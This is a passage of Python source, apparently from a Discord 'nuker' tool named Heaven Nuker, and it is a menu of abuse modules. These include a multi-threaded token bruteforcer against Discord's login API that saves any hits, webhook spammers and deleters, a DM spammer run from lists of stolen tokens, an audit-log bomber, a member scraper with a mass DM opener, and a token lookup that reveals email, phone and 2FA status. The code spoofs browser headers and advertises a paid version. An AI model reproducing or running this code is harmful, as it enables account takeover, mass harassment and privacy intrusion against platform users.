                            sys.stdout.flush()
                            Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                else:
                    characters = string.ascii_letters + string.digits
                    first = ''.join(random.choices(characters, k=4))
                    characters2 = string.ascii_letters + string.digits
                    second = ''.join(random.choices(characters2, k=25))
                    brute_token = id_to_token + "." + first + "." + second
                    token = brute_token.replace("=", "")
                    headers = {
                        'Authorization': token
                        }
                    login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
                    if login.status_code == 200:
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Bruteforced {gray}| ", end='')
                        sys.stdout.flush()
                        Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                        folder = "Results"
                        if not os.path.exists(folder):
                            os.makedirs(folder)
                        with open(f"Results/token_bruteforced.txt", "w") as bruted:
                            bruted.write(token + "\n")
                        Write.Print(f"\nroot@press_enter ~> ", Colors.purple_to_red, interval=0.000); input()
                        radu_tool()
                    else:
                        with output_lock:
                            time_rn = get_time_rn()
                            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Invalid {gray}| ", end='')
                            sys.stdout.flush()
                            Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
        def run_brute():
            while True:
                try:
                    bruteforce()
                except Exception as e:
                    pass
        
        threads = []
        for _ in range(50):
            thread = threading.Thread(target=run_brute)
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()
    if opc=="3":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Webhook Deleter')
        Write.Print(f"""
(1) Single Webhook Deleter
(2) Multi Webhook Deleter
""", Colors.purple_to_red, interval=0.000)
        Write.Print(f"\nroot@option ~> ", Colors.purple_to_red, interval=0.000); option = input()
        if option=="1":
            Write.Print(f"\nWebhook ~> ", Colors.purple_to_red, interval=0.000); webhook = input()
            requests.delete(webhook)
            time_rn = get_time_rn()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Successfully Nuked {gray}| ", end='')
            sys.stdout.flush()
            Write.Print(webhook[:70] + "*****\n", Colors.purple_to_red, interval=0.000)
            Write.Print(f"\nroot@press_enter ~> ", Colors.purple_to_red, interval=0.000); input()
            radu_tool()
        if option=="2":
            webhook_list = open(easygui.fileopenbox(), 'r').read().splitlines()
            for webhook in webhook_list:
                requests.delete(webhook)
                time_rn = get_time_rn()
                print()
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Successfully Nuked {gray}| ", end='')
                sys.stdout.flush()
                Write.Print(webhook[:70] + "*****\n", Colors.purple_to_red, interval=0.000)
            Write.Print(f"\nroot@press_enter ~> ", Colors.purple_to_red, interval=0.000); input()
            radu_tool()
        else:
            radu_tool()
    if opc=="4":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Webhook Spammer')
        Write.Print(f"""
(1) Single Webhook Spammer
(2) Multi Webhook Spammer
""", Colors.purple_to_red, interval=0.000)
        Write.Print(f"\nroot@option ~> ", Colors.purple_to_red, interval=0.000); option = input()
        if option=="1":
            Write.Print(f"\nWebhook ~> ", Colors.purple_to_red, interval=0.000); webhook = input()
            Write.Print(f"Message ~> ", Colors.purple_to_red, interval=0.000); message = input()
            Write.Print(f"How Many Messages? ~> ", Colors.purple_to_red, interval=0.000); howmany = input()
            payload = {
                "content": message
            }
            data_json = json.dumps(payload)
            headers = {
                "Content-Type": "application/json"
            }

            for i in range(int(howmany)):
                time_rn = get_time_rn()
                time.sleep(0.0001)
                response = session.post(webhook, data=data_json, headers=headers)
                if response.status_code == 200 or response.status_code == 204:
                    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Sent Message {gray}| ", end='')
                    sys.stdout.flush()
                    Write.Print(message + "\n", Colors.purple_to_red, interval=0.000)
                else:
                    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Failed To Send Message {gray}| ", end='')
                    sys.stdout.flush()
                    Write.Print(message + "\n", Colors.purple_to_red, interval=0.000)
        if option=="2":
            def send(webhook, message):
                    time_rn = get_time_rn()
                    time.sleep(0.0001)
                    response = session.post(webhook, data=data_json, headers=headers)
                    if response.status_code == 200 or response.status_code == 204:
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Sent Message {gray}| ", end='')
                    else:
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Failed To Send Message {gray}| ", end='')
                        time.sleep(0.2)

            webhook_list = open(easygui.fileopenbox(), 'r').read().splitlines()
            Write.Print(f"\nMessage ~> ", Colors.purple_to_red, interval=0.000); message = input()
            payload = {
                "content": message
            }
            data_json = json.dumps(payload)
            headers = {
                "Content-Type": "application/json"
            }
            def run_webhook():
                while True:
                    webhook = random.choice(webhook_list)
                    send(webhook, message)
                    time.sleep(0.001)
            
            threads = []
            for _ in range(30):
                thread = threading.Thread(target=run_webhook)
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()
        else:
            radu_tool()   
    if opc=="5":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Member Booster')
        Write.Print(f"\nUpdate Soon (Patched)\nThis option is for the paid version of Heaven Nuker if you want to buy it: https://t.me/waltuhium ", Colors.red, interval=0.000); 
        radu_tool()
    if opc=="6":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : DM Spammer')
        def DMSpammer(idd, message, token):
            payload = {
                'recipient_id': idd
            }
            headers = {
                'authorization': token,
                "accept": "*/*",
                "accept-language": "en-GB",
                "content-length": str(len(dumps(payload))),
                "content-type": "application/json",
                "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                "origin": "https://discord.com",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": xsup
            }
            r1 = requests.post(f'https://discord.com/api/v9/users/@me/channels', headers=headers, json=payload)

            payload = {
                "content": message,
                "tts": False
            }
            j = json.loads(r1.content)

            while True:
                rsp = requests.post(f"https://discord.com/api/v9/channels/{j['id']}/messages", headers=headers, json=payload)
                time_rn = get_time_rn()
                if rsp.status_code == 429:
                    ratelimit = json.loads(rsp.content)
                    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Ratelimit {gray}| ", str(float(ratelimit['retry_after'])) + f"{yellow} Seconds")
                    time.sleep(float(ratelimit['retry_after']))
                elif rsp.status_code == 200:
                    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Successfully Sent DM {gray}| ", end='')
                    sys.stdout.flush()
                    Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
        Write.Print(f"""
(1) Single Token DM Spammer
(2) Multi Token DM Spammer
""", Colors.purple_to_red, interval=0.000)
        Write.Print(f"\nroot@choice ~> ", Colors.purple_to_red, interval=0.000); opc1 = input()
        if opc1=="1":
            Write.Print(f"\nroot@token ~> ", Colors.purple_to_red, interval=0.000); token = input()
            Write.Print(f"root@user_id ~> ", Colors.purple_to_red, interval=0.000); user = input()
            Write.Print(f"root@message ~> ", Colors.purple_to_red, interval=0.000); message = input()
            DMSpammer(user, message, token)
        else:
            tokens = open("tokens.txt", "r").read().splitlines()
            Write.Print(f"\nroot@user_id ~> ", Colors.purple_to_red, interval=0.000); user = input()
            Write.Print(f"root@message ~> ", Colors.purple_to_red, interval=0.000); message = input()
            def thread_dm():
                for token in tokens:
                    threading.Thread(target=DMSpammer, args=(user, message, token)).start()
            thread_dm()
    if opc=="7":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Token Disabler')
        Write.Print(f"\nThis option is for the paid version of Heaven Nuker if you want to buy it: https://t.me/waltuhium ", Colors.red, interval=0.000); token = input()
        
    if opc=="8":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Forum Flooder')
        Write.Print(f"\nThis option is for the paid version of Heaven Nuker if you want to buy it: https://t.me/waltuhium ", Colors.red, interval=0.000); howmany = input()
        
        
    if opc=="9":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Fake Typing')
        Write.Print(f"\nThis option is for the paid version of Heaven Nuker if you want to buy it: https://t.me/waltuhium ", Colors.red, interval=0.000); channel_id = input()
        
    if opc=="10":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Friend Spammer')
        Write.Print(f"\nThis option is for the paid version of Heaven Nuker if you want to buy it: https://t.me/waltuhium ", Colors.red, interval=0.000); usertag = input()
        
    if opc=="11":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Voice Joiner')
        Write.Print(f"\nThis option is for the paid version of Heaven Nuker if you want to buy it: https://t.me/waltuhium ", Colors.red, interval=0.000); server_id = input()
        

        
    if opc=="12":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Thread Spammer')
        Write.Print(f"\nThis option is for the paid version of Heaven Nuker if you want to buy it: https://t.me/waltuhium ", Colors.red, interval=0.000); channel_id = input()
        
        
    if opc=="13":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Token Onliner')
        Write.Print(f"\nThis option is for the paid version of Heaven Nuker if you want to buy it: https://t.me/waltuhium", Colors.red, interval=0.000); status_choice = input()
        
    if opc=="14":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Nickname Changer')
        Write.Print(f"\nroot@server_id ~> ", Colors.purple_to_red, interval=0.000); server_id = input()
        Write.Print(f"root@nickname ~> ", Colors.purple_to_red, interval=0.000); nickname = input()
        output_lock = threading.Lock()
        print()

        def nickname_changer(token):
            payload = {
                "nick": nickname
            }

            headers = {
                'authorization': token,
                "accept": "*/*",
                "accept-language": "en-GB",
                "content-length": str(len(dumps(payload))),
                "content-type": "application/json",
                "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                "origin": "https://discord.com",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": xsup
            }
            r = session.patch(f"https://discord.com/api/v9/guilds/{server_id}/members/@me/nick", headers=headers, json=payload)
            if r.status_code != 200:
                with output_lock:
                    time_rn = get_time_rn()
                    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Failed {gray}| ", end='')
                    sys.stdout.flush()
                    Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                    pass
            else:
                with output_lock:
                    time_rn = get_time_rn()
                    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Changed Nickname {gray}| ", end='')
                    sys.stdout.flush()
                    Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                    pass
        
        def process_token(token):
            nickname_changer(token)

        def main():
            with open("tokens.txt", "r", encoding='utf-8') as f:
                tokens = f.read().splitlines()

            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(process_token, tokens)
        
        main()
        Write.Print(f"\nroot@press_enter ~> ", Colors.purple_to_red, interval=0.000); input()
        radu_tool()
    if opc=="15":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Channel Spammer')
        Write.Print(f"\nThis option is for the paid version of Heaven Nuker if you want to buy it: https://t.me/waltuhium ", Colors.red, interval=0.000); channel_id = input()
        
        
    if opc=="16":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Reply Spammer')
        Write.Print(f"\nThis option is for the paid version of Heaven Nuker if you want to buy it: https://t.me/waltuhium ", Colors.red, interval=0.000); channel_id = input()
           
    if opc=="17":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Webhook Creator')
        Write.Print(f"\nroot@token ~> ", Colors.purple_to_red, interval=0.000); token = input()
        Write.Print(f"root@channel_id ~> ", Colors.purple_to_red, interval=0.000); channel_id = input()
        Write.Print(f"root@webhook_name ~> ", Colors.purple_to_red, interval=0.000); webhook_name = input()
        print()
        output_lock = threading.Lock()
        data = {
            "name": webhook_name,
        }
        def create_webhook():
            url = f"https://discord.com/api/v9/channels/{channel_id}/webhooks"
            headers = {
                "Authorization": token
            }
            r = requests.post(url, headers=headers, json=data)
            if r.status_code == 200:
                with output_lock:
                    time_rn = get_time_rn()
                    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Created Webhook {gray}| ", end='')
                    sys.stdout.flush()
                    Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                    pass
            else:
                with output_lock:
                    time_rn = get_time_rn()
                    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Failed (More Than 15 Webhooks Reached) {gray}| ", end='')
                    sys.stdout.flush()
                    Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                    Write.Print(f"\nroot@press_enter ~> ", Colors.purple_to_red, interval=0.000); input()
                    radu_tool()

        while True:
            create_webhook()
    if opc=="18":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Reaction Spammer')
        Write.Print(f"\nThis option is for the paid version of Heaven Nuker if you want to buy it: https://t.me/waltuhium ", Colors.red, interval=0.000); channel_id = input()
        
        
    
        
    if opc=="20":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Server Leaver')
        Write.Print(f"\nThis option is for the paid version of Heaven Nuker if you want to buy it: https://t.me/waltuhium ", Colors.red, interval=0.000); token = input()
        
    if opc=="22":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Hypesquad Joiner')
        def hypesquad_joiner(token, hype_id, hype_squad):
            if hype_id == "Random":
                hype_list = ["1", "2", "3"]
                hype_id = random.choice(hype_list)
                if hype_id == "1":
                    hype_squad = "Bravery"
                if hype_id == "2":
                    hype_squad = "Brilliance"
                if hype_id == "3":
                    hype_squad = "Balance"
            else:
                hype_id = hype_id

            headers = {
                "Authorization": token
            }

            payload = {
                "house_id": hype_id
            }

            url = "https://discord.com/api/v9/hypesquad/online"
            r = session.post(url=url, headers=headers, json=payload)
            if r.status_code != 204:
                with output_lock:
                    time_rn = get_time_rn()
                    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Failed{gray} | ", end='')
                    sys.stdout.flush()
                    Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
            else:
                with output_lock:
                    time_rn = get_time_rn()
                    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Changed To {hype_squad} {gray}| ", end='')
                    sys.stdout.flush()
                    Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
        
        output_lock = threading.Lock()
        Write.Print(f"\n(1) Bravery\n(2) Brilliance\n(3) Balance\n(4) Random Hypesquad \n\nroot@choice ~> ", Colors.purple_to_red, interval=0.000); select = input()
        print()
        if select=="1":
            hype_id = 1
            hype_squad = "Bravery"
        elif select=="2":
            hype_id = 2
            hype_squad = "Brilliance"
        elif select=="3":
            hype_id = 3
            hype_squad = "Balance"
        elif select=="4":
            hype_id = "Random"
            hype_squad = "None"
        else:
            hype_id = "Random"
            hype_squad = "None"

        def process_token(token):
            hypesquad_joiner(token, hype_id, hype_squad)

        def main():
            with open("tokens.txt", "r", encoding='utf-8') as f:
                tokens = f.read().splitlines()

            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(process_token, tokens)
        
        main()
        Write.Print(f"\nroot@press_enter ~> ", Colors.purple_to_red, interval=0.000); input()
        radu_tool()
    if opc=="23":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Pin Message Spammer')
        Write.Print(f"\nThis option is for the paid version of Heaven Nuker if you want to buy it: https://t.me/waltuhium ", Colors.red, interval=0.000); token = input()
        
    if opc=="24":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : DM Deleter')
        Write.Print(f"\nroot@token ~> ", Colors.purple_to_red, interval=0.000); token = input()
        output_lock = threading.Lock()
        print()
        headers = {
            "Authorization": token
        }

        r = session.get("https://discord.com/api/v9/users/@me/channels", headers=headers)
        f = r.json()
        for channel in f:
            with open(f"data/temp_dm.txt", "a+", encoding='utf-8') as f:
                f.write(channel['id'] + "\n")
        
        def delete_dm(channel_id):
            url_new = f'https://discord.com/api/v9/channels/{channel_id}'
            session.delete(url=url_new, headers=headers)
            with output_lock:
                time_rn = get_time_rn()
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Deleted DM {gray}| ", end='')
                sys.stdout.flush()
                Write.Print(channel_id + "\n", Colors.purple_to_red, interval=0.000)
        
        threads = []

        with open("data/temp_dm.txt", "r", encoding='utf-8') as pene:
            r = pene.readlines()
            for channel_id in r:
                channel_id = channel_id.strip()
                t = threading.Thread(target=delete_dm, args=(channel_id,))
                threads.append(t)
                t.start()
                time.sleep(0.19)

        for t in threads:
            t.join()
        
        os.remove("data/temp_dm.txt")
        Write.Print(f"\nroot@press_enter ~> ", Colors.purple_to_red, interval=0.000); input()
        radu_tool()
    if opc=="25":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Token Information')
        output_lock = threading.Lock()
        Write.Print(f"\nroot@token ~> ", Colors.purple_to_red, interval=0.000); token = input()
        print()
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62",
            "Authorization": token
        }

        r = requests.get(f"https://discord.com/api/v9/users/@me/burst-credits", headers=headers)
        if r.status_code == 200:
            url_api_info = "https://discord.com/api/v9/users/@me"
            r = json.loads(requests.get(url_api_info, headers=headers).text)
            user_id = r['id']
            username = r['username']
            has_email = r['email']
            has_phone = r['phone']
            mfa = r['mfa_enabled']
            locale = r['locale']
            avatar = r['avatar']
            verified = r['verified']
            flagged = r['flags']
            if flagged == 0:
                flags = "False"
            else:
                flags = "True"

            time_rn = get_time_rn()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}User ID {gray}| {pink}{user_id}")
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Username {gray}| {pink}{username}")
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Email {gray}| {pink}{has_email}")
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Phone {gray}| {pink}{has_phone}")
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}2FA Enabled {gray}| {pink}{mfa}")
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Locale {gray}| {pink}{locale}")
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Avatar {gray}| {pink}{avatar}")
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Verified {gray}| {pink}{verified}")
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Flagged {gray}| {pink}{flags}")

        else:
            pass
        Write.Print(f"\nroot@press_enter ~> ", Colors.purple_to_red, interval=0.000); input()
        radu_tool()
    if opc=="26":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Audit Bomber')
        output_lock = threading.Lock()
        Write.Print(f"\nroot@server_id ~> ", Colors.purple_to_red, interval=0.000); server_id = input()
        print()
        def audit_bomber(token):
            payload = {
                "nick": "https://t.me/waltuhium"
            }

            headers = {
                'authorization': token,
                "accept": "*/*",
                "accept-language": "en-GB",
                "content-length": str(len(dumps(payload))),
                "content-type": "application/json",
                "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                "origin": "https://discord.com",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": xsup
            }

            for i in range(5):
                r = session.patch(f"https://discord.com/api/v9/guilds/{server_id}/members/@me/nick", headers=headers, json=payload)
                if r.status_code != 200:
                    with output_lock:
                        time_rn = get_time_rn()
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Failed {gray}| ", end='')
                        sys.stdout.flush()
                        Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                        time.sleep(0.09)
                        pass
                else:
                    with output_lock:
                        time_rn = get_time_rn()
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Bombed Audit {gray}| ", end='')
                        sys.stdout.flush()
                        Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                        time.sleep(0.09)
                        pass
        
        def process_token(token):
            audit_bomber(token)

        def main():
            with open("tokens.txt", "r", encoding='utf-8') as f:
                tokens = f.read().splitlines()

            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(process_token, tokens)
        
        main()
        Write.Print(f"\nroot@press_enter ~> ", Colors.purple_to_red, interval=0.000); input()
        radu_tool()
    if opc=="27":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Member ID Scraper')
        output_lock = threading.Lock()
        Write.Print(f"\nroot@token ~> ", Colors.purple_to_red, interval=0.000); token = input()
        Write.Print(f"root@server_id ~> ", Colors.purple_to_red, interval=0.000); guild_id = input()
        Write.Print(f"root@channel_id ~> ", Colors.purple_to_red, interval=0.000); channel_id = input()
        print()
        class DevNull:
            def write(self, _):
                pass

            def flush(self):
                pass

        logging.getLogger('discum').setLevel(logging.CRITICAL)
        sys.stdout = DevNull()

        try:
            bot = discum.Client(token=token)

            def closefetching(nothing,guildid):
                if bot.gateway.finishedMemberFetching(guildid):
                    bot.gateway.removeCommand({'function':closefetching, 'params':{'guildid':guildid}})
                    bot.gateway.close()

            def getmembers(guildid,channelid):
                bot.gateway.fetchMembers(guildid, channelid, keep='all',wait=1)
                bot.gateway.command({'function':closefetching,'params':{'guildid':guildid}})
                bot.gateway.run()
                bot.gateway.resetSession()
                return bot.gateway.session.guild(guildid).members

            members = getmembers(guild_id, channel_id)
            memberids = []

            for memberId in members:
                memberids.append(memberId)

            with open('data/scraped_ids.txt','w') as ids:
                for element in memberids:
                    ids.write(element + '\n')
        except KeyError:
            pass

        except Exception as e:
            pass

        time.sleep(2)
        sys.stdout = sys.__stdout__

        with open('data/scraped_ids.txt', 'r') as print_id:
            for id in print_id:
                try:
                    with output_lock:
                        time_rn = get_time_rn()
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Scraped Member ID {gray}| ", end='')
                        sys.stdout.flush()
                        Write.Print(id.strip() + "\n", Colors.purple_to_red, interval=0.000)
                except KeyError:
                    pass
        
        Write.Print(f"\nroot@press_enter ~> ", Colors.purple_to_red, interval=0.000); input()
        radu_tool()
    if opc=="28":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : DM Opener')
        output_lock = threading.Lock()
        Write.Print(f"\nroot@token ~> ", Colors.purple_to_red, interval=0.000); token = input()
        
        def open_dm(user):
            payload = {
                "recipients": [user]
            }

            headers = {
                'authorization': token,
                "accept": "*/*",
                "accept-language": "en-GB",
                "content-length": str(len(dumps(payload))),
                "content-type": "application/json",
                "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                "origin": "https://discord.com",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": xsup
            }

            r_dm = session.post(f"https://discord.com/api/v9/users/@me/channels", headers=headers, json=payload)
            json = r_dm.json()
            if r_dm.status_code == 200:
                time_rn = get_time_rn()
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({dark_green}+{gray}) {pretty}DM Opened {gray}|{pink}", (json["recipients"][0]["username"]))
                channel = json["id"]
            elif r_dm.status_code == 403:
                time_rn = get_time_rn()
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Failed Opening DM {gray}|{red} Status Code 403")
            else:
                time_rn = get_time_rn()
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({yellow}/{gray}) {pretty}Failed Opening DM {gray}|{yellow} Ratelimit")
        
        executor = concurrent.futures.ThreadPoolExecutor(max_workers=5)

        with open('data/scraped_ids.txt', 'r') as ids:
            user_ids = [line.strip() for line in ids]

        futures_open_dm = [executor.submit(open_dm, user) for user in user_ids]

        for future in concurrent.futures.as_completed(futures_open_dm):
            result = future.result()

        Write.Print(f"\nroot@press_enter ~> ", Colors.purple_to_red, interval=0.000); input()
        radu_tool()
    if opc=="29":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Message Cleaner')
        Write.Print(f"\nroot@token ~> ", Colors.purple_to_red, interval=0.000); token = input()
        Write.Print(f"root@channel_id ~> ", Colors.purple_to_red, interval=0.000); channel_id = input()
        print()
        output_lock = threading.Lock()
        url = f'https://discord.com/api/v9/channels/{channel_id}/messages'

        headers = {
            'authorization': token,
        }
        
        r = session.get(url=url, headers=headers)
        msg = r.json()
        for m in msg:
            with output_lock:
                time_rn = get_time_rn()
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({magenta}~{gray}) {pretty}Scraped Message ID {gray}| ", end='')
                sys.stdout.flush()
                Write.Print(str(m['id']) + "\n", Colors.purple_to_red, interval=0.000)
            with open(f"data/temp_delete.txt", "a+", encoding='utf-8') as f:
                f.write(str(m['id']) + "\n")

        time.sleep(1)

        def process_message(message_id):
            url_new = f'https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}'
            session.delete(url=url_new, headers=headers)
            with output_lock:
                time_rn = get_time_rn()
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Deleted Message {gray}| ", end='')
                sys.stdout.flush()
                Write.Print(message_id + "\n", Colors.purple_to_red, interval=0.000)

        threads = []

        with open("data/temp_delete.txt", "r", encoding='utf-8') as pene:
            r = pene.readlines()
            for msg_id in r:
                msg_id = msg_id.strip()
                t = threading.Thread(target=process_message, args=(msg_id,))
                threads.append(t)
                t.start()
                time.sleep(0.19)

        for t in threads:
            t.join()
        
        os.remove("data/temp_delete.txt")
        Write.Print(f"\nroot@press_enter ~> ", Colors.purple_to_red, interval=0.000); input()
        radu_tool()
    if opc==">" or opc==">>":
        radu_tool2()
        pass
    else:
        radu_tool()
radu_tool()